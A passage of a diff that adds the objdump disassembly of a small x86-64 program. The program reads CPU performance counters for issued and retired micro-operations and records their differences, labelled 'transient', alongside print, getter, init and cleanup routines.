+    15ab:	8b 05 b7 3b 20 00    	mov    0x203bb7(%rip),%eax        # 205168 <pmc_idx_retired>
+    15b1:	89 c7                	mov    %eax,%edi
+    15b3:	e8 61 fd ff ff       	callq  1319 <read_pmc_rdpmc>
+    15b8:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
+    15bc:	eb 22                	jmp    15e0 <pmu_uops_snap_after+0x66>
+    15be:	8b 05 2c 1b 20 00    	mov    0x201b2c(%rip),%eax        # 2030f0 <fd_uops_issued>
+    15c4:	89 c7                	mov    %eax,%edi
+    15c6:	e8 74 fd ff ff       	callq  133f <read_pmc_fd>
+    15cb:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
+    15cf:	8b 05 1f 1b 20 00    	mov    0x201b1f(%rip),%eax        # 2030f4 <fd_uops_retired>
+    15d5:	89 c7                	mov    %eax,%edi
+    15d7:	e8 63 fd ff ff       	callq  133f <read_pmc_fd>
+    15dc:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
+    15e0:	8b 05 9a fb 20 00    	mov    0x20fb9a(%rip),%eax        # 211180 <uops_cnt>
+    15e6:	3d ff 0f 00 00       	cmp    $0xfff,%eax
+    15eb:	0f 8f 9e 00 00 00    	jg     168f <pmu_uops_snap_after+0x115>
+    15f1:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
+    15f5:	89 c2                	mov    %eax,%edx
+    15f7:	48 8b 05 72 3b 20 00 	mov    0x203b72(%rip),%rax        # 205170 <snap_issued>
+    15fe:	29 c2                	sub    %eax,%edx
+    1600:	89 d0                	mov    %edx,%eax
+    1602:	89 45 e4             	mov    %eax,-0x1c(%rbp)
+    1605:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
+    1609:	89 c2                	mov    %eax,%edx
+    160b:	48 8b 05 66 3b 20 00 	mov    0x203b66(%rip),%rax        # 205178 <snap_retired>
+    1612:	29 c2                	sub    %eax,%edx
+    1614:	89 d0                	mov    %edx,%eax
+    1616:	89 45 e8             	mov    %eax,-0x18(%rbp)
+    1619:	8b 55 e4             	mov    -0x1c(%rbp),%edx
+    161c:	8b 45 e8             	mov    -0x18(%rbp),%eax
+    161f:	29 c2                	sub    %eax,%edx
+    1621:	89 d0                	mov    %edx,%eax
+    1623:	89 45 ec             	mov    %eax,-0x14(%rbp)
+    1626:	8b 05 54 fb 20 00    	mov    0x20fb54(%rip),%eax        # 211180 <uops_cnt>
+    162c:	48 98                	cltq   
+    162e:	48 8d 0c 85 00 00 00 	lea    0x0(,%rax,4),%rcx
+    1635:	00 
+    1636:	48 8d 05 43 3b 20 00 	lea    0x203b43(%rip),%rax        # 205180 <transient_arr>
+    163d:	8b 55 ec             	mov    -0x14(%rbp),%edx
+    1640:	89 14 01             	mov    %edx,(%rcx,%rax,1)
+    1643:	8b 05 37 fb 20 00    	mov    0x20fb37(%rip),%eax        # 211180 <uops_cnt>
+    1649:	48 98                	cltq   
+    164b:	48 8d 0c 85 00 00 00 	lea    0x0(,%rax,4),%rcx
+    1652:	00 
+    1653:	48 8d 05 26 7b 20 00 	lea    0x207b26(%rip),%rax        # 209180 <issued_delta_arr>
+    165a:	8b 55 e4             	mov    -0x1c(%rbp),%edx
+    165d:	89 14 01             	mov    %edx,(%rcx,%rax,1)
+    1660:	8b 05 1a fb 20 00    	mov    0x20fb1a(%rip),%eax        # 211180 <uops_cnt>
+    1666:	48 98                	cltq   
+    1668:	48 8d 0c 85 00 00 00 	lea    0x0(,%rax,4),%rcx
+    166f:	00 
+    1670:	48 8d 05 09 bb 20 00 	lea    0x20bb09(%rip),%rax        # 20d180 <retired_delta_arr>
+    1677:	8b 55 e8             	mov    -0x18(%rbp),%edx
+    167a:	89 14 01             	mov    %edx,(%rcx,%rax,1)
+    167d:	8b 05 fd fa 20 00    	mov    0x20fafd(%rip),%eax        # 211180 <uops_cnt>
+    1683:	83 c0 01             	add    $0x1,%eax
+    1686:	89 05 f4 fa 20 00    	mov    %eax,0x20faf4(%rip)        # 211180 <uops_cnt>
+    168c:	eb 01                	jmp    168f <pmu_uops_snap_after+0x115>
+    168e:	90                   	nop
+    168f:	c9                   	leaveq 
+    1690:	c3                   	retq   
+
+0000000000001691 <pmu_uops_print_results>:
+    1691:	55                   	push   %rbp
+    1692:	48 89 e5             	mov    %rsp,%rbp
+    1695:	48 83 ec 10          	sub    $0x10,%rsp
+    1699:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
+    16a0:	e9 8b 00 00 00       	jmpq   1730 <pmu_uops_print_results+0x9f>
+    16a5:	8b 45 fc             	mov    -0x4(%rbp),%eax
+    16a8:	48 98                	cltq   
+    16aa:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
+    16b1:	00 
+    16b2:	48 8d 05 c7 3a 20 00 	lea    0x203ac7(%rip),%rax        # 205180 <transient_arr>
+    16b9:	8b 14 02             	mov    (%rdx,%rax,1),%edx
+    16bc:	8b 45 fc             	mov    -0x4(%rbp),%eax
+    16bf:	89 c6                	mov    %eax,%esi
+    16c1:	48 8d 3d 51 04 00 00 	lea    0x451(%rip),%rdi        # 1b19 <_IO_stdin_used+0xd9>
+    16c8:	b8 00 00 00 00       	mov    $0x0,%eax
+    16cd:	e8 ce f2 ff ff       	callq  9a0 <printf@plt>
+    16d2:	8b 45 fc             	mov    -0x4(%rbp),%eax
+    16d5:	48 98                	cltq   
+    16d7:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
+    16de:	00 
+    16df:	48 8d 05 9a 7a 20 00 	lea    0x207a9a(%rip),%rax        # 209180 <issued_delta_arr>
+    16e6:	8b 14 02             	mov    (%rdx,%rax,1),%edx
+    16e9:	8b 45 fc             	mov    -0x4(%rbp),%eax
+    16ec:	89 c6                	mov    %eax,%esi
+    16ee:	48 8d 3d 3b 04 00 00 	lea    0x43b(%rip),%rdi        # 1b30 <_IO_stdin_used+0xf0>
+    16f5:	b8 00 00 00 00       	mov    $0x0,%eax
+    16fa:	e8 a1 f2 ff ff       	callq  9a0 <printf@plt>
+    16ff:	8b 45 fc             	mov    -0x4(%rbp),%eax
+    1702:	48 98                	cltq   
+    1704:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
+    170b:	00 
+    170c:	48 8d 05 6d ba 20 00 	lea    0x20ba6d(%rip),%rax        # 20d180 <retired_delta_arr>
+    1713:	8b 14 02             	mov    (%rdx,%rax,1),%edx
+    1716:	8b 45 fc             	mov    -0x4(%rbp),%eax
+    1719:	89 c6                	mov    %eax,%esi
+    171b:	48 8d 3d 28 04 00 00 	lea    0x428(%rip),%rdi        # 1b4a <_IO_stdin_used+0x10a>
+    1722:	b8 00 00 00 00       	mov    $0x0,%eax
+    1727:	e8 74 f2 ff ff       	callq  9a0 <printf@plt>
+    172c:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
+    1730:	8b 05 4a fa 20 00    	mov    0x20fa4a(%rip),%eax        # 211180 <uops_cnt>
+    1736:	39 45 fc             	cmp    %eax,-0x4(%rbp)
+    1739:	0f 8c 66 ff ff ff    	jl     16a5 <pmu_uops_print_results+0x14>
+    173f:	90                   	nop
+    1740:	c9                   	leaveq 
+    1741:	c3                   	retq   
+
+0000000000001742 <pmu_uops_get_count>:
+    1742:	55                   	push   %rbp
+    1743:	48 89 e5             	mov    %rsp,%rbp
+    1746:	8b 05 34 fa 20 00    	mov    0x20fa34(%rip),%eax        # 211180 <uops_cnt>
+    174c:	5d                   	pop    %rbp
+    174d:	c3                   	retq   
+
+000000000000174e <pmu_uops_get_transient>:
+    174e:	55                   	push   %rbp
+    174f:	48 89 e5             	mov    %rsp,%rbp
+    1752:	89 7d fc             	mov    %edi,-0x4(%rbp)
+    1755:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
+    1759:	78 24                	js     177f <pmu_uops_get_transient+0x31>
+    175b:	8b 05 1f fa 20 00    	mov    0x20fa1f(%rip),%eax        # 211180 <uops_cnt>
+    1761:	39 45 fc             	cmp    %eax,-0x4(%rbp)
+    1764:	7d 19                	jge    177f <pmu_uops_get_transient+0x31>
+    1766:	8b 45 fc             	mov    -0x4(%rbp),%eax
+    1769:	48 98                	cltq   
+    176b:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
+    1772:	00 
+    1773:	48 8d 05 06 3a 20 00 	lea    0x203a06(%rip),%rax        # 205180 <transient_arr>
+    177a:	8b 04 02             	mov    (%rdx,%rax,1),%eax
+    177d:	eb 05                	jmp    1784 <pmu_uops_get_transient+0x36>
+    177f:	b8 00 00 00 00       	mov    $0x0,%eax
+    1784:	5d                   	pop    %rbp
+    1785:	c3                   	retq   
+
+0000000000001786 <pmu_uops_get_issued_delta>:
+    1786:	55                   	push   %rbp
+    1787:	48 89 e5             	mov    %rsp,%rbp
+    178a:	89 7d fc             	mov    %edi,-0x4(%rbp)
+    178d:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
+    1791:	78 24                	js     17b7 <pmu_uops_get_issued_delta+0x31>
+    1793:	8b 05 e7 f9 20 00    	mov    0x20f9e7(%rip),%eax        # 211180 <uops_cnt>
+    1799:	39 45 fc             	cmp    %eax,-0x4(%rbp)
+    179c:	7d 19                	jge    17b7 <pmu_uops_get_issued_delta+0x31>
+    179e:	8b 45 fc             	mov    -0x4(%rbp),%eax
+    17a1:	48 98                	cltq   
+    17a3:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
+    17aa:	00 
+    17ab:	48 8d 05 ce 79 20 00 	lea    0x2079ce(%rip),%rax        # 209180 <issued_delta_arr>
+    17b2:	8b 04 02             	mov    (%rdx,%rax,1),%eax
+    17b5:	eb 05                	jmp    17bc <pmu_uops_get_issued_delta+0x36>
+    17b7:	b8 00 00 00 00       	mov    $0x0,%eax
+    17bc:	5d                   	pop    %rbp
+    17bd:	c3                   	retq   
+
+00000000000017be <pmu_uops_get_retired_delta>:
+    17be:	55                   	push   %rbp
+    17bf:	48 89 e5             	mov    %rsp,%rbp
+    17c2:	89 7d fc             	mov    %edi,-0x4(%rbp)
+    17c5:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
+    17c9:	78 24                	js     17ef <pmu_uops_get_retired_delta+0x31>
+    17cb:	8b 05 af f9 20 00    	mov    0x20f9af(%rip),%eax        # 211180 <uops_cnt>
+    17d1:	39 45 fc             	cmp    %eax,-0x4(%rbp)
+    17d4:	7d 19                	jge    17ef <pmu_uops_get_retired_delta+0x31>
+    17d6:	8b 45 fc             	mov    -0x4(%rbp),%eax
+    17d9:	48 98                	cltq   
+    17db:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
+    17e2:	00 
+    17e3:	48 8d 05 96 b9 20 00 	lea    0x20b996(%rip),%rax        # 20d180 <retired_delta_arr>
+    17ea:	8b 04 02             	mov    (%rdx,%rax,1),%eax
+    17ed:	eb 05                	jmp    17f4 <pmu_uops_get_retired_delta+0x36>
+    17ef:	b8 00 00 00 00       	mov    $0x0,%eax
+    17f4:	5d                   	pop    %rbp
+    17f5:	c3                   	retq   
+
+00000000000017f6 <pmu_uops_auto_init>:
+    17f6:	55                   	push   %rbp
+    17f7:	48 89 e5             	mov    %rsp,%rbp
+    17fa:	48 83 ec 10          	sub    $0x10,%rsp
+    17fe:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%rbp)
+    1805:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
+    180c:	bf 0e 01 00 00       	mov    $0x10e,%edi
+    1811:	e8 88 fb ff ff       	callq  139e <setup_pmc>
+    1816:	89 05 d4 18 20 00    	mov    %eax,0x2018d4(%rip)        # 2030f0 <fd_uops_issued>
+    181c:	bf c2 02 00 00       	mov    $0x2c2,%edi
+    1821:	e8 78 fb ff ff       	callq  139e <setup_pmc>
+    1826:	89 05 c8 18 20 00    	mov    %eax,0x2018c8(%rip)        # 2030f4 <fd_uops_retired>
+    182c:	8b 05 be 18 20 00    	mov    0x2018be(%rip),%eax        # 2030f0 <fd_uops_issued>
+    1832:	85 c0                	test   %eax,%eax
+    1834:	78 0a                	js     1840 <pmu_uops_auto_init+0x4a>
+    1836:	8b 05 b8 18 20 00    	mov    0x2018b8(%rip),%eax        # 2030f4 <fd_uops_retired>
+    183c:	85 c0                	test   %eax,%eax
+    183e:	79 2f                	jns    186f <pmu_uops_auto_init+0x79>
+    1840:	48 8b 05 b9 18 20 00 	mov    0x2018b9(%rip),%rax        # 203100 <stderr@@GLIBC_2.2.5>
+    1847:	48 89 c1             	mov    %rax,%rcx
+    184a:	ba 3f 00 00 00       	mov    $0x3f,%edx
+    184f:	be 01 00 00 00       	mov    $0x1,%esi
+    1854:	48 8d 3d 0d 03 00 00 	lea    0x30d(%rip),%rdi        # 1b68 <_IO_stdin_used+0x128>
+    185b:	e8 d0 f1 ff ff       	callq  a30 <fwrite@plt>
+    1860:	c7 05 1a f9 20 00 00 	movl   $0x0,0x20f91a(%rip)        # 211184 <uops_available>
+    1867:	00 00 00 
+    186a:	e9 16 01 00 00       	jmpq   1985 <pmu_uops_auto_init+0x18f>
+    186f:	8b 05 7b 18 20 00    	mov    0x20187b(%rip),%eax        # 2030f0 <fd_uops_issued>
+    1875:	48 8d 35 e8 38 20 00 	lea    0x2038e8(%rip),%rsi        # 205164 <pmc_idx_issued>
+    187c:	89 c7                	mov    %eax,%edi
+    187e:	e8 08 fc ff ff       	callq  148b <setup_and_try_mmap>
+    1883:	89 45 f8             	mov    %eax,-0x8(%rbp)
+    1886:	8b 05 68 18 20 00    	mov    0x201868(%rip),%eax        # 2030f4 <fd_uops_retired>
+    188c:	48 8d 35 d5 38 20 00 	lea    0x2038d5(%rip),%rsi        # 205168 <pmc_idx_retired>
+    1893:	89 c7                	mov    %eax,%edi
+    1895:	e8 f1 fb ff ff       	callq  148b <setup_and_try_mmap>
+    189a:	89 45 fc             	mov    %eax,-0x4(%rbp)
+    189d:	83 7d f8 00          	cmpl   $0x0,-0x8(%rbp)
+    18a1:	74 76                	je     1919 <pmu_uops_auto_init+0x123>
+    18a3:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
+    18a7:	74 70                	je     1919 <pmu_uops_auto_init+0x123>
+    18a9:	8b 05 b5 38 20 00    	mov    0x2038b5(%rip),%eax        # 205164 <pmc_idx_issued>
+    18af:	89 c7                	mov    %eax,%edi
+    18b1:	e8 67 f9 ff ff       	callq  121d <test_rdpmc>
+    18b6:	85 c0                	test   %eax,%eax
+    18b8:	74 33                	je     18ed <pmu_uops_auto_init+0xf7>
+    18ba:	c7 05 9c 38 20 00 01 	movl   $0x1,0x20389c(%rip)        # 205160 <use_rdpmc>
+    18c1:	00 00 00 
+    18c4:	8b 0d 9e 38 20 00    	mov    0x20389e(%rip),%ecx        # 205168 <pmc_idx_retired>
+    18ca:	8b 15 94 38 20 00    	mov    0x203894(%rip),%edx        # 205164 <pmc_idx_issued>
+    18d0:	48 8b 05 29 18 20 00 	mov    0x201829(%rip),%rax        # 203100 <stderr@@GLIBC_2.2.5>
+    18d7:	48 8d 35 ca 02 00 00 	lea    0x2ca(%rip),%rsi        # 1ba8 <_IO_stdin_used+0x168>
+    18de:	48 89 c7             	mov    %rax,%rdi
+    18e1:	b8 00 00 00 00       	mov    $0x0,%eax
+    18e6:	e8 05 f1 ff ff       	callq  9f0 <fprintf@plt>
+    18eb:	eb 56                	jmp    1943 <pmu_uops_auto_init+0x14d>
+    18ed:	c7 05 69 38 20 00 00 	movl   $0x0,0x203869(%rip)        # 205160 <use_rdpmc>
+    18f4:	00 00 00 
+    18f7:	48 8b 05 02 18 20 00 	mov    0x201802(%rip),%rax        # 203100 <stderr@@GLIBC_2.2.5>
+    18fe:	48 89 c1             	mov    %rax,%rcx
+    1901:	ba 49 00 00 00       	mov    $0x49,%edx
+    1906:	be 01 00 00 00       	mov    $0x1,%esi
+    190b:	48 8d 3d d6 02 00 00 	lea    0x2d6(%rip),%rdi        # 1be8 <_IO_stdin_used+0x1a8>
+    1912:	e8 19 f1 ff ff       	callq  a30 <fwrite@plt>
+    1917:	eb 2a                	jmp    1943 <pmu_uops_auto_init+0x14d>
+    1919:	c7 05 3d 38 20 00 00 	movl   $0x0,0x20383d(%rip)        # 205160 <use_rdpmc>
+    1920:	00 00 00 
+    1923:	48 8b 05 d6 17 20 00 	mov    0x2017d6(%rip),%rax        # 203100 <stderr@@GLIBC_2.2.5>
+    192a:	48 89 c1             	mov    %rax,%rcx
+    192d:	ba 2f 00 00 00       	mov    $0x2f,%edx
+    1932:	be 01 00 00 00       	mov    $0x1,%esi
+    1937:	48 8d 3d fa 02 00 00 	lea    0x2fa(%rip),%rdi        # 1c38 <_IO_stdin_used+0x1f8>
+    193e:	e8 ed f0 ff ff       	callq  a30 <fwrite@plt>
+    1943:	c7 05 37 f8 20 00 01 	movl   $0x1,0x20f837(%rip)        # 211184 <uops_available>
+    194a:	00 00 00 
+    194d:	8b 05 0d 38 20 00    	mov    0x20380d(%rip),%eax        # 205160 <use_rdpmc>
+    1953:	85 c0                	test   %eax,%eax
+    1955:	74 09                	je     1960 <pmu_uops_auto_init+0x16a>
+    1957:	48 8d 05 0a 03 00 00 	lea    0x30a(%rip),%rax        # 1c68 <_IO_stdin_used+0x228>
+    195e:	eb 07                	jmp    1967 <pmu_uops_auto_init+0x171>
+    1960:	48 8d 05 07 03 00 00 	lea    0x307(%rip),%rax        # 1c6e <_IO_stdin_used+0x22e>
+    1967:	48 8b 0d 92 17 20 00 	mov    0x201792(%rip),%rcx        # 203100 <stderr@@GLIBC_2.2.5>
+    196e:	48 89 c2             	mov    %rax,%rdx
+    1971:	48 8d 35 08 03 00 00 	lea    0x308(%rip),%rsi        # 1c80 <_IO_stdin_used+0x240>
+    1978:	48 89 cf             	mov    %rcx,%rdi
+    197b:	b8 00 00 00 00       	mov    $0x0,%eax
+    1980:	e8 6b f0 ff ff       	callq  9f0 <fprintf@plt>
+    1985:	c9                   	leaveq 
+    1986:	c3                   	retq   
+
+0000000000001987 <pmu_uops_auto_fini>:
+    1987:	55                   	push   %rbp
+    1988:	48 89 e5             	mov    %rsp,%rbp
+    198b:	8b 05 5f 17 20 00    	mov    0x20175f(%rip),%eax        # 2030f0 <fd_uops_issued>
+    1991:	85 c0                	test   %eax,%eax
+    1993:	78 0d                	js     19a2 <pmu_uops_auto_fini+0x1b>
+    1995:	8b 05 55 17 20 00    	mov    0x201755(%rip),%eax        # 2030f0 <fd_uops_issued>
+    199b:	89 c7                	mov    %eax,%edi
+    199d:	e8 2e f0 ff ff       	callq  9d0 <close@plt>
+    19a2:	8b 05 4c 17 20 00    	mov    0x20174c(%rip),%eax        # 2030f4 <fd_uops_retired>
+    19a8:	85 c0                	test   %eax,%eax
+    19aa:	78 0d                	js     19b9 <pmu_uops_auto_fini+0x32>
+    19ac:	8b 05 42 17 20 00    	mov    0x201742(%rip),%eax        # 2030f4 <fd_uops_retired>
+    19b2:	89 c7                	mov    %eax,%edi
+    19b4:	e8 17 f0 ff ff       	callq  9d0 <close@plt>
+    19b9:	90                   	nop
+    19ba:	5d                   	pop    %rbp
+    19bb:	c3                   	retq   
+    19bc:	0f 1f 40 00          	nopl   0x0(%rax)
+
+00000000000019c0 <__libc_csu_init>:
+    19c0:	41 57                	push   %r15
+    19c2:	41 56                	push   %r14
+    19c4:	49 89 d7             	mov    %rdx,%r15
+    19c7:	41 55                	push   %r13
+    19c9:	41 54                	push   %r12
+    19cb:	4c 8d 25 4e 13 20 00 	lea    0x20134e(%rip),%r12        # 202d20 <__frame_dummy_init_array_entry>
+    19d2:	55                   	push   %rbp
+    19d3:	48 8d 2d 5e 13 20 00 	lea    0x20135e(%rip),%rbp        # 202d38 <__init_array_end>
+    19da:	53                   	push   %rbx
+    19db:	41 89 fd             	mov    %edi,%r13d
+    19de:	49 89 f6             	mov    %rsi,%r14
+    19e1:	4c 29 e5             	sub    %r12,%rbp
+    19e4:	48 83 ec 08          	sub    $0x8,%rsp
+    19e8:	48 c1 fd 03          	sar    $0x3,%rbp
+    19ec:	e8 47 ef ff ff       	callq  938 <_init>
+    19f1:	48 85 ed             	test   %rbp,%rbp
+    19f4:	74 20                	je     1a16 <__libc_csu_init+0x56>
+    19f6:	31 db                	xor    %ebx,%ebx
+    19f8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
+    19ff:	00 
+    1a00:	4c 89 fa             	mov    %r15,%rdx
+    1a03:	4c 89 f6             	mov    %r14,%rsi
+    1a06:	44 89 ef             	mov    %r13d,%edi
+    1a09:	41 ff 14 dc          	callq  *(%r12,%rbx,8)
+    1a0d:	48 83 c3 01          	add    $0x1,%rbx
+    1a11:	48 39 dd             	cmp    %rbx,%rbp
+    1a14:	75 ea                	jne    1a00 <__libc_csu_init+0x40>
+    1a16:	48 83 c4 08          	add    $0x8,%rsp
+    1a1a:	5b                   	pop    %rbx
+    1a1b:	5d                   	pop    %rbp
+    1a1c:	41 5c                	pop    %r12
+    1a1e:	41 5d                	pop    %r13
+    1a20:	41 5e                	pop    %r14
+    1a22:	41 5f                	pop    %r15
+    1a24:	c3                   	retq   
+    1a25:	90                   	nop
+    1a26:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
+    1a2d:	00 00 00 
+
+0000000000001a30 <__libc_csu_fini>:
+    1a30:	f3 c3                	repz retq 
+
+Disassembly of section .fini:
+
+0000000000001a34 <_fini>:
+    1a34:	48 83 ec 08          	sub    $0x8,%rsp
+    1a38:	48 83 c4 08          	add    $0x8,%rsp
+    1a3c:	c3                   	retq   
